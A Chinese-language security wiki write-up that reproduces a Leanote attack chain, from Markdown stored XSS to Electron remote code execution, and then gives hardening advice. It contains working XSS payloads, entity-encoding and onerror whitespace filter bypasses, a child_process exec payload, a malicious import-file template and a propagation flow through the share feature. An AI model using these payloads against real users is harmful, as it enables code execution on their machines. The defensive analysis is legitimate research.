---
title: Leanote 笔记应用从 Markdown XSS 到 Electron RCE 完整攻击链复现与分析
description: 深度复现 Leanote 笔记应用中 Markdown 渲染引发的存储型 XSS、客户端 Electron 框架 RCE 利用链，涵盖超链接注入、标签闭合绕过、HTML
  实体编码绕过、导入导出功能远程投递、分享功能传播及 Node.js child_process 远程代码执行全流程。
category: program-analysis
tags:
- Leanote
- Markdown XSS
- Electron RCE
- 存储型 XSS
- 客户端漏洞
- Node.js child_process
- 远程代码执行
- 攻击链复现
- 红队技术
- 漏洞分析
date: '2024-01-15'
updated: '2026-11-15'
---

## 概述

Leanote（蚂蚁笔记）是一款开源的云笔记应用，支持 Markdown 编辑、多端同步、博客发布等功能。本文复现并分析其 **Markdown 渲染环节存在的跨站脚本攻击（XSS）漏洞**，并进一步利用 **Electron 框架客户端的 Node.js 集成特性**，实现从 **客户端 XSS 到远程代码执行（RCE）的完整攻击链**。

攻击链核心路径：
1. **Markdown 编辑器 XSS** → 通过超链接语法与标签闭合注入恶意载荷
2. **HTML 实体编码绕过** → 规避 `javascript:` 伪协议过滤
3. **服务端存储型 XSS** → 通过“同步到博客”功能持久化存储至数据库，Web 端同步触发
4. **客户端 Electron RCE** → 利用 Electron 内置 Node.js 环境，调用 `child_process` 执行系统命令
5. **远程投递与传播** → 利用导入导出功能绕过标签过滤（空格绕过 `onerror`）、分享功能二次传播，实现无需用户交互的远程代码执行

## 漏洞环境与版本信息

| 组件 | 版本/说明 |
|------|-----------|
| 目标应用 | Leanote（蚂蚁笔记）桌面客户端 |
| 客户端框架 | **Electron**（基于 Chromium + Node.js） |
| 编辑器组件 | Editor.md / 自研 Markdown 渲染器 |
| 同步功能 | 支持同步至 Leanote 云端博客（`leanote.com`） |
| 导入导出 | 支持笔记本级别的导入/导出（JSON 格式） |
| 分享功能 | 支持笔记分享、移动至个人分组 |

> **参考来源**：微信公众号归档文章《Leanote 从 XSS 到 RCE》（原文链接已失效，GitHub Issue：[leanote/leanote#899](https://github.com/leanote/leanote/issues/899)）

## 攻击链阶段一：Markdown 编辑器 XSS 挖掘与绕过

### 超链接语法注入点分析

Markdown 标准超链接语法：`[链接文本](URL)`，渲染为 HTML：`<a href="URL">链接文本</a>`。

**三大可控注入点**：
- 链接文本（`[...]` 内容）→ 对应 `<a>` 标签内部文本节点
- URL 地址（`(...)` 内容）→ 对应 `href` 属性值
- 标题属性（可选 `[text](url "title")`）→ 对应 `title` 属性值

**实测截图对应注入点**：
![注入点分析](../Images/09104f9c3895633300f6fb29b7c1b049.png)

### 标签闭合与伪协议尝试

**Payload 构造**：
```markdown
[click](javascript:alert(1))
```
渲染后 HTML：
```html
<a href="javascript:alert(1)">click</a>
```
**结果**：`javascript:` 伪协议被前端过滤拦截。

### HTML 实体编码绕过

**绕过原理**：HTML 属性值支持实体编码，浏览器解析时会自动解码。

**编码示例**：
- `j` → `&#106;` / `&#x6a;`
- `a` → `&#97;` / `&#x61;`
- `v` → `&#118;` / `&#x76;`
- `a` → `&#97;`
- `s` → `&#115;`
- `c` → `&#99;`
- `r` → `&#114;`
- `i` → `&#105;`
- `p` → `&#112;`
- `t` → `&#116;`
- `:` → `&#58;`

**绕过 Payload**：
```markdown
[click](&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1))
```
**结果**：成功触发 `alert(1)`，验证 XSS 存在。

### 标签闭合注入（非 Editor.md 组件）

目标程序另一处 Markdown 渲染器（历史记录/预览栏）存在标签闭合漏洞。

**Payload**：
```markdown
[click</a><img src=1 onerror=alert(1)>](http://baidu.com)
```
**渲染链**：
1. `click</a>` 闭合原 `<a>` 标签
2. `<img src=1 onerror=alert(1)>` 注入新标签
3. 触发 `onerror` 事件执行 JS

**验证截图**：
![标签闭合注入成功](../Images/858c4d279c7b3651fa65a934b89bc9a5.png)

> **关联技术**：[[pikachu-target-writeup-part2-xss]]、[[xss-haozi-lab-walkthrough]]、[[xd-security-xss-vulnerability-notes-day25-28]] 中的标签闭合、属性逃逸、编码绕过技巧均适用于此场景。

## 攻击链阶段二：服务端存储型 XSS 持久化

### 同步到博客功能分析

Leanote 客户端左侧提供 **“同步到博客”** 功能，将本地笔记推送至 `leanote.com` 云端。

**触发流程**：
1. 用户编写含 XSS Payload 的笔记
2. 点击“同步到博客” → 笔记内容经 API 存入数据库
3. 访问博客文章页面（如 `http://leanote.com/blog/post/5e7235d9ab64414a2200769e`） → 服务端直接渲染未过滤内容

**验证截图**：
![博客页面触发 XSS](../Images/32c3a2cd4504db29d004978c6a66f755.png)

### Web 端笔记同步触发

云端存储后，用户在 **Web 端登录 Leanote** 查看笔记时，恶意脚本同步执行，实现跨端持久化 XSS。

**验证截图**：
![Web 端同步触发](../Images/bc10d99f116af682dbbe1d8bcb1eb3f6.png)

> **影响范围**：所有同步该笔记的客户端（Windows/macOS/Linux）、Web 端、移动端均受影响。

## 攻击链阶段三：客户端 Electron 框架识别与 RCE 原理

### Electron 架构特性

Electron = **Chromium（渲染进程）** + **Node.js（主进程）**，渲染进程默认拥有 **Node.js API 访问权限**（除非开启 `contextIsolation` 与 `nodeIntegration: false`）。

**关键 API**：`child_process.exec` / `child_process.spawn` → 可执行任意系统命令。

### 客户端技术栈确认

**方法一：目录结构分析**
```
Leanote 安装目录/
├── resources/
│   ├── app/
│   │   ├── login.html        ← 登录页面，确认为前端页面
│   │   ├── main.js           ← Electron 入口
│   │   └── ...
│   └── app.asar              ← 打包后的应用代码
```
**截图验证**：
![目录结构发现 login.html](../Images/b4b762dd4a23b3c1716e8c4dd73cfa96.png)
![login.html 确认为登录界面](../Images/792025e7f39e0773591aa6f958df64cc.png)

**方法二：进程监控（Procmon / Process Monitor）**
监听进程创建，观察到 `electron.exe` 进程特征。

**截图验证**：
![Procmon 监听确认 Electron](../Images/ec84f095c54efa62cb5567f2e06a9720.png)

### Node.js child_process RCE 验证

**RCE Payload**：
```javascript
require('child_process').exec('calc.exe')  // Windows 弹计算器
// 或
require('child_process').exec('open -a Calculator')  // macOS
```

**完整 XSS 载荷构造**：
```markdown
[click</a><img src=1 onerror="require('child_process').exec('calc.exe')">](http://baidu.com)
```

**验证截图**：
![child_process RCE 验证](../Images/41e0cce021b1e7596949111f82a77ca7.png)

> **关联技术**：[[macos-memory-execution-macho-loader-m1-mitigations]] 涉及 Electron/macOS 内存执行对抗，[[aceldr-technical-analysis]] 覆盖 PE 不落地执行与反射式加载，Electron RCE 属于 **渲染进程代码执行** 典型场景，可结合 [[argument-spoofing-edr-evasion]] 进程创建参数欺骗对抗 EDR 监控。

## 攻击链阶段四：远程投递与传播利用链

### 导入导出功能分析

Leanote 支持 **笔记本级导出**（JSON 格式）与 **导入**，攻击者可构造恶意导出文件诱导受害者导入。

**导出文件结构示例**：
```json
{
  "notes": [
    {
      "title": "恶意笔记",
      "content": "[click</a><img src=1 onerror=payload>](url)",
      "created_time": "...",
      "updated_time": "..."
    }
  ]
}
```

### 导入过滤绕过：空格绕过 `onerror` 属性过滤

**过滤规则**：导入时过滤 `<script>`、`<img>` 标签及 `onerror` 等危险属性。

**绕过技巧**：HTML 属性名与值之间允许空白字符（空格、制表符、换行符）。

**绕过 Payload**：
```html
<img src=1 onerror = "payload">
<!-- 或 -->
<img src=1 onerror= "payload">
```

**验证截图**：
![空格绕过 onerror 过滤](../Images/af49d9656621b37d4d6ed848f277c744.png)

### 分享功能二次传播

Leanote Web 端提供 **分享笔记** 功能，生成公开/私有链接。

**攻击流程**：
1. 攻击者导入恶意笔记本 → 笔记同步至云端
2. 攻击者点击“分享” → 生成分享链接
3. 受害者访问分享链接 → Web 端渲染触发 XSS
4. 受害者点击“移动到我的分组” → 笔记同步至受害者账户
5. 受害者启动桌面客户端 → 客户端同步下载笔记 → **历史记录/预览栏渲染触发 RCE**

**验证截图**：
![分享功能](../Images/c1e4285cbe22d9143718a8c114f7e516.png)
![移动至分组](../Images/bc2b84ba9073ba0c4b63f6a4b369d0a2.png)
![客户端历史记录触发 RCE](../Images/b86628f753627f21d33e16b6df745505.png)

### 攻击链完整拓扑

```mermaid
graph LR
    A[攻击者构造恶意 Markdown 笔记] --> B[导出 JSON 文件]
    B --> C[诱导受害者导入/分享链接访问]
    C --> D{受害者操作}
    D -->|Web 端查看| E[存储型 XSS 触发<br/>窃取 Cookie/Session]
    D -->|移动至分组| F[笔记同步至受害者账户]
    F --> G[受害者启动 Electron 客户端]
    G --> H[客户端同步下载笔记]
    H --> I[历史记录/预览渲染引擎解析]
    I --> J[标签闭合 + onerror 绕过]
    J --> K[require('child_process').exec()]
    K --> L[任意命令执行 RCE]
```

## 防御与缓解建议

### Markdown 渲染安全加固

| 防御层面 | 措施 |
|----------|------|
| **渲染器配置** | 启用 `sanitize: true`（如 marked.js、showdown.js），使用 DOMPurify 二次净化 |
| **内容安全策略 (CSP)** | 在 Electron `BrowserWindow` 中设置 `webPreferences: { contextIsolation: true, nodeIntegration: false, sandbox: true }`，并配置严格 CSP：`script-src 'self'; object-src 'none'; base-uri 'none';` |
| **Markdown 解析白名单** | 仅允许安全标签（`p, h1-h6, ul, ol, li, code, pre, blockquote, table, thead, tbody, tr, th, td, strong, em, a[href|title], img[src|alt]`），移除所有事件属性（`on*`） |
| **URL 协议白名单** | `href` 仅允许 `http:`, `https:`, `mailto:`，拦截 `javascript:`, `data:`, `vbscript:` 等伪协议 |

### Electron 安全基线（参考 [Electron Security Checklist](https://www.electronjs.org/docs/latest/tutorial/security)）

```javascript
// main.js 安全配置示例
const mainWindow = new BrowserWindow({
  webPreferences: {
    contextIsolation: true,        // 隔离渲染进程与主进程上下文
    nodeIntegration: false,        // 禁用渲染进程 Node.js API
    sandbox: true,                 // 启用沙箱（Chromium 沙箱）
    preload: path.join(__dirname, 'preload.js'), // 预加载脚本暴露最小必要 API
    webviewTag: false,             // 禁用 <webview> 标签
    allowRunningInsecureContent: false,
    experimentalFeatures: false
  }
});

// CSP 响应头
mainWindow.webContents.session.webRequest.onHeadersReceived((details, callback) => {
  callback({
    responseHeaders: {
      ...details.responseHeaders,
      'Content-Security-Policy': ["default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none'; frame-ancestors 'none';"]
    }
  });
});
```

### 导入导出与同步功能加固

- **导入端**：服务端与客户端双重校验，使用 DOMPurify 处理 Markdown/HTML 内容，移除所有事件处理器与危险标签
- **同步端**：入库前统一净化，渲染时输出编码（HTML Entity Encode）
- **分享链接**：设置短时效 Token，限制渲染域（`X-Frame-Options: DENY`）

### 客户端历史记录/预览渲染隔离

- 历史记录预览使用 **无 Node.js 集成的沙箱 WebView** 或 **静态 HTML 快照**（去除脚本）
- 或采用 **仅渲染纯文本/安全子集 Markdown** 的轻量预览器

## 相关漏洞披露与修复状态

| 时间 | 事件 |
|------|------|
| 数月前 | 研究者向 Leanote 官方提交客户端 XSS 与服务端存储型 XSS 报告 |
| 披露时 | 官方未修复，GitHub Issue [#899](https://github.com/leanote/leanote/issues/899) 仍开放 |
| 建议 | 用户尽量使用 Web 端（浏览器沙箱隔离），避免导入不可信笔记本文件，禁用自动同步博客功能 |

## 交叉引用与延伸阅读

| 主题 | 关联页面 | 说明 |
|------|----------|------|
| **XSS 绕过技巧大全** | [[pikachu-target-writeup-part2-xss]]、[[xss-haozi-lab-walkthrough]]、[[xd-security-xss-vulnerability-notes-day25-28]] | 标签闭合、属性逃逸、编码绕过、CSP 绕过、BeEF 框架利用 |
| **Electron/Node.js 桌面应用安全** | [[macos-memory-execution-macho-loader-m1-mitigations]]、[[aceldr-technical-analysis]] | Electron 渲染进程 RCE、内存执行、代码签名绕过 |
| **子进程执行与 EDR 对抗** | [[argument-spoofing-edr-evasion]]、[[ppl-injection-createprocess-bof-fix]] | `child_process` 衍生进程参数欺骗、PPL 进程注入绕过 |
| **红队客户端攻击面** | [[badusb-hid-attack-arduino-leonardo]]、[[phishing-website-creation-tutorial]] | 物理接触 HID 攻击、钓鱼页面凭证窃取、客户端漏洞利用链 |
| **CTF 实战 Web 漏洞复现** | [[attack-defense-world-beginner-web-writeup]]、[[buuctf-web-writeup-collection]]、[[ctfshow-web-sql-injection-bypass-basics]] | 系统性 Web 漏洞挖掘与利用技巧库 |

## 总结

Leanote 案例完整展示了 **「前端渲染漏洞 → 服务端持久化 → 客户端框架特性放大 → 远程投递传播」** 的经典攻击链放大路径：

1. **Markdown XSS** 因渲染器未充分净化、开发者过度信任第三方库而引入
2. **Electron `nodeIntegration: true`** 打破了浏览器沙箱边界，将 XSS 直接升级为 **本地 RCE**
3. **导入导出/分享功能** 成为完美的 **远程载荷投递与蠕虫式传播通道**
4. **空格绕过属性过滤** 揭示了基于黑名单的前端过滤在 HTML 解析容错性面前的脆弱性

**核心教训**：
- **永远不要在 Electron 渲染进程启用 `nodeIntegration`**，必须采用 `contextIsolation + preload` 最小权限暴露模式
- **Markdown 渲染必须经过 DOMPurify 等成熟库净化**，不可自行编写正则过滤
- **客户端数据同步入口（导入/分享/同步）必须实施与 Web 端同等甚至更严格的输入验证**
- **桌面应用安全测试需纳入「客户端 XSS → RCE」放大链路** 作为必测场景

> 本页面基于归档文章《Leanote 从 XSS 到 RCE》整理，技术细节仅供安全研究与防御加固参考，严禁用于未授权测试或非法用途。

## 来源

- [226安全团队-201805-202103_11](../sources/226安全团队-201805-202103_11.md)
